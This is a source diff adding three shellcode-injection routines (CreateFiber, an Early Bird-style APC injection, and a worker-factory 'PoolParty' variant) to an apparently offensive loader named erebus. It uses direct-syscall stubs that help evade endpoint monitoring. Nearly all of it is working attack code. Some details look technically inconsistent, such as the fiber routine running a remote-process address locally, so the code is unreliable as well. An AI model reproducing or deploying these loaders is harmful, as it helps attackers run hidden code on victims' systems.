@@ -224,4 +224,184 @@ namespace erebus {
 
 		return;
 	}
+
+	VOID InjectionCreateFiber(IN BYTE* shellcode, IN SIZE_T shellcode_size, IN HANDLE hProcess, IN HANDLE hThread)
+	{
+		LOG_INFO("Injection via. CreateFiber");
+
+		PVOID base_address = NULL;
+
+		base_address = erebus::WriteShellcodeInMemory(hProcess, shellcode, shellcode_size);
+		if (base_address == NULL) {
+			LOG_ERROR("Failed to write shellcode to memory region");
+			return;
+		}
+
+		// Convert current thread to fiber
+		LPVOID main_fiber = ConvertThreadToFiber(NULL);
+		if (main_fiber == NULL) {
+			LOG_ERROR("Failed to convert thread to fiber (Code: 0x%08lX)", GetLastError());
+			return;
+		}
+
+		LOG_SUCCESS("Converted thread to fiber");
+
+		// Create a new fiber pointing to shellcode
+		LPVOID shellcode_fiber = CreateFiber(0, (LPFIBER_START_ROUTINE)base_address, NULL);
+		if (shellcode_fiber == NULL) {
+			LOG_ERROR("Failed to create fiber (Code: 0x%08lX)", GetLastError());
+			return;
+		}
+
+		LOG_SUCCESS("Created shellcode fiber at: 0x%08pX", shellcode_fiber);
+
+		// Switch to shellcode fiber
+		LOG_INFO("Switching to shellcode fiber...");
+		SwitchToFiber(shellcode_fiber);
+
+		// Cleanup (won't reach here if shellcode doesn't return)
+		DeleteFiber(shellcode_fiber);
+
+		LOG_SUCCESS("Injection Complete!");
+
+		return;
+	}
+
+	VOID InjectionEarlyCascade(IN BYTE* shellcode, IN SIZE_T shellcode_size, IN HANDLE hProcess, IN HANDLE hThread)
+	{
+		LOG_INFO("Injection via. EarlyCascade (Early Bird APC)");
+
+		PVOID base_address = NULL;
+
+		base_address = erebus::WriteShellcodeInMemory(hProcess, shellcode, shellcode_size);
+		if (base_address == NULL) {
+			LOG_ERROR("Failed to write shellcode to memory region");
+			return;
+		}
+
+		// Queue APC to suspended thread (Early Bird technique)
+		NTSTATUS status = Sw3NtQueueApcThread(hThread, (PPS_APC_ROUTINE)base_address, NULL, NULL, NULL);
+		if (!NT_SUCCESS(status)) {
+			LOG_ERROR("Failed to queue APC (NTSTATUS: 0x%08X)", status);
+			return;
+		}
+
+		LOG_SUCCESS("APC queued to suspended thread");
+
+		// Resume thread to execute APC
+		status = Sw3NtResumeThread(hThread, NULL);
+		if (!NT_SUCCESS(status)) {
+			LOG_ERROR("Failed to resume thread (NTSTATUS: 0x%08X)", status);
+			return;
+		}
+
+		LOG_SUCCESS("Thread resumed, shellcode executing before process initialization");
+
+		Sw3NtClose(hThread);
+		Sw3NtClose(hProcess);
+
+		LOG_SUCCESS("Injection Complete!");
+
+		return;
+	}
+
+	VOID InjectionPoolParty(IN BYTE* shellcode, IN SIZE_T shellcode_size, IN HANDLE hProcess, IN HANDLE hThread)
+	{
+		LOG_INFO("Injection via. PoolParty (Worker Factory)");
+
+		PVOID base_address = NULL;
+
+		base_address = erebus::WriteShellcodeInMemory(hProcess, shellcode, shellcode_size);
+		if (base_address == NULL) {
+			LOG_ERROR("Failed to write shellcode to memory region");
+			return;
+		}
+
+		// Create IO Completion Port
+		HANDLE hPort = CreateIoCompletionPort(INVALID_HANDLE_VALUE, NULL, 0, 0);
+		if (hPort == NULL) {
+			LOG_ERROR("Failed to create IO completion port (Code: 0x%08lX)", GetLastError());
+			return;
+		}
+
+		LOG_SUCCESS("IO Completion Port created");
+
+		// Prepare object attributes for worker factory
+		OBJECT_ATTRIBUTES oa = { sizeof(OBJECT_ATTRIBUTES) };
+		HANDLE hWorkerFactory = NULL;
+
+		// NtCreateWorkerFactory parameters
+		typedef NTSTATUS(NTAPI* typeNtCreateWorkerFactory)(
+			PHANDLE WorkerFactoryHandle,
+			ACCESS_MASK DesiredAccess,
+			POBJECT_ATTRIBUTES ObjectAttributes,
+			HANDLE CompletionPortHandle,
+			HANDLE WorkerProcessHandle,
+			PVOID StartRoutine,
+			PVOID StartParameter,
+			ULONG MaxThreadCount,
+			SIZE_T StackReserve,
+			SIZE_T StackCommit
+			);
+
+		ImportModule(ntdll);
+		ImportFunction(ntdll, typeNtCreateWorkerFactory, NtCreateWorkerFactory);
+
+		if (NtCreateWorkerFactory == NULL) {
+			LOG_ERROR("Failed to resolve NtCreateWorkerFactory");
+			CloseHandle(hPort);
+			return;
+		}
+
+		NTSTATUS status = NtCreateWorkerFactory(
+			&hWorkerFactory,
+			WORKER_FACTORY_ALL_ACCESS,
+			&oa,
+			hPort,
+			hProcess,
+			base_address,  // Start routine points to shellcode
+			NULL,
+			1,
+			0,
+			0
+		);
+
+		if (!NT_SUCCESS(status)) {
+			LOG_ERROR("Failed to create worker factory (NTSTATUS: 0x%08X)", status);
+			CloseHandle(hPort);
+			return;
+		}
+
+		LOG_SUCCESS("Worker Factory created");
+
+		// Trigger worker thread creation
+		typedef NTSTATUS(NTAPI* typeNtSetInformationWorkerFactory)(
+			HANDLE WorkerFactoryHandle,
+			ULONG WorkerFactoryInformationClass,
+			PVOID WorkerFactoryInformation,
+			ULONG WorkerFactoryInformationLength
+			);
+
+		ImportFunction(ntdll, typeNtSetInformationWorkerFactory, NtSetInformationWorkerFactory);
+
+		if (NtSetInformationWorkerFactory) {
+			status = NtSetInformationWorkerFactory(hWorkerFactory, 1, &base_address, sizeof(PVOID));
+			if (!NT_SUCCESS(status)) {
+				LOG_ERROR("Failed to set worker factory information (NTSTATUS: 0x%08X)", status);
+			}
+			else {
+				LOG_SUCCESS("Worker factory triggered");
+			}
+		}
+
+		// Cleanup
+		CloseHandle(hWorkerFactory);
+		CloseHandle(hPort);
+		Sw3NtClose(hThread);
+		Sw3NtClose(hProcess);
+
+		LOG_SUCCESS("Injection Complete!");
+
+		return;
+	}
 } // End of erebus namespace
